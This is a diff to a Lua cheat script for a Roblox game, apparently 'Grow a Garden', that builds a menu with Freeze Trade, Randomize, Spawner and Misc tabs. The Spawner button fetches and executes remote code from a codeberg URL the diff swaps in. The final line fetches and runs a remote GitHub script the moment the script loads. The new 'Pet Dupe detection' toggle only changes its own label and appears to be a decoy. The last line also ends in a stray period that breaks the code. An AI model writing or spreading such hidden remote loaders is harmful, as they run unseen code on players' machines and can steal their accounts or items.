@@ -4,11 +4,9 @@ local TweenService = game:GetService("TweenService")
 local TeleportService = game:GetService("TeleportService")
 local player = Players.LocalPlayer
 
--- Main UI
 local screenGui = Instance.new("ScreenGui", game.CoreGui)
 screenGui.Name = "UnifiedUI"
 
--- Toggle Button
 local toggleButton = Instance.new("TextButton")
 toggleButton.Size = UDim2.new(0, 100, 0, 30)
 toggleButton.Position = UDim2.new(0, 10, 0.5, -15)
@@ -19,7 +17,6 @@ toggleButton.Font = Enum.Font.GothamBold
 toggleButton.TextSize = 14
 toggleButton.Parent = screenGui
 
--- Main Frame
 local mainFrame = Instance.new("Frame")
 mainFrame.Size = UDim2.new(0, 420, 0, 340)
 mainFrame.Position = UDim2.new(0.5, -210, 0.5, -170)
@@ -30,7 +27,6 @@ mainFrame.Active = true
 mainFrame.Draggable = true
 Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
 
--- Sidebar (Top Bar)
 local tabBar = Instance.new("Frame")
 tabBar.Size = UDim2.new(1, 0, 0, 40)
 tabBar.Position = UDim2.new(0, 0, 0, 0)
@@ -41,6 +37,7 @@ local tabs = {
     {Name = "Freeze Trade"},
     {Name = "Randomize"},
     {Name = "Spawner"},
+    {Name = "Misc"},
 }
 local contentFrames = {}
 
@@ -50,11 +47,10 @@ local function hideAllTabs()
     end
 end
 
--- Create content frames
 for i, tabInfo in ipairs(tabs) do
     local tabBtn = Instance.new("TextButton")
-    tabBtn.Size = UDim2.new(0, 130, 0, 30)
-    tabBtn.Position = UDim2.new(0, (i - 1) * 140 + 10, 0, 5)
+    tabBtn.Size = UDim2.new(0, 100, 0, 30)
+    tabBtn.Position = UDim2.new(0, (i - 1) * 110 + 10, 0, 5)
     tabBtn.Text = tabInfo.Name
     tabBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
     tabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -76,7 +72,6 @@ for i, tabInfo in ipairs(tabs) do
     end)
 end
 
--- Freeze Trade Tab
 do
     local frame = contentFrames["Freeze Trade"]
 
@@ -146,7 +141,6 @@ do
     end)
 end
 
--- Randomize Tab
 do
     local frame = contentFrames["Randomize"]
 
@@ -175,7 +169,6 @@ do
     end)
 end
 
--- Spawner Tab
 do
     local frame = contentFrames["Spawner"]
     local spawnBtn = Instance.new("TextButton", frame)
@@ -187,14 +180,52 @@ do
     spawnBtn.Font = Enum.Font.GothamBold
     spawnBtn.TextSize = 16
     spawnBtn.MouseButton1Click:Connect(function()
-        local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
-Spawner.Load()
+        local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
+        Spawner.Load()
     end)
 end
 
--- Toggle open/close mainFrame
+do
+    local frame = contentFrames["Misc"]
+
+    local dupeToggle = false
+
+    local btnDupeDetect = Instance.new("TextButton", frame)
+    btnDupeDetect.Size = UDim2.new(0.9, 0, 0, 40)
+    btnDupeDetect.Position = UDim2.new(0.05, 0, 0.2, 0)
+    btnDupeDetect.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+    btnDupeDetect.Text = "Nhận dạng Pet Du.pe : OFF"
+    btnDupeDetect.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btnDupeDetect.Font = Enum.Font.GothamBold
+    btnDupeDetect.TextSize = 16
+    btnDupeDetect.Parent = frame
+
+    local function showNotification(msg)
+        local notif = Instance.new("TextLabel", frame)
+        notif.Size = UDim2.new(1, 0, 0, 25)
+        notif.Position = UDim2.new(0, 0, 1, -30)
+        notif.Text = msg
+        notif.TextColor3 = Color3.fromRGB(0, 255, 100)
+        notif.BackgroundTransparency = 1
+        notif.Font = Enum.Font.Gotham
+        notif.TextSize = 14
+        TweenService:Create(notif, TweenInfo.new(0.4), {
+            Position = notif.Position - UDim2.new(0,0,0,30),
+            TextTransparency = 0.1
+        }):Play()
+        game:GetService("Debris"):AddItem(notif, 2)
+    end
+
+    btnDupeDetect.MouseButton1Click:Connect(function()
+        dupeToggle = not dupeToggle
+        btnDupeDetect.Text = "Nhận dạng Pet Du.pe : " .. (dupeToggle and "ON" or "OFF")
+        showNotification("Nhận dạng Pet Du.pe " .. (dupeToggle and "bật" or "tắt"))
+    end)
+end
+
 toggleButton.MouseButton1Click:Connect(function()
     mainFrame.Visible = not mainFrame.Visible
     toggleButton.Text = mainFrame.Visible and "Close" or "Open"
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Finder/refs/heads/main/Khngscript"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Khangdz28/Finder/refs/heads/main/Khngscript"))().
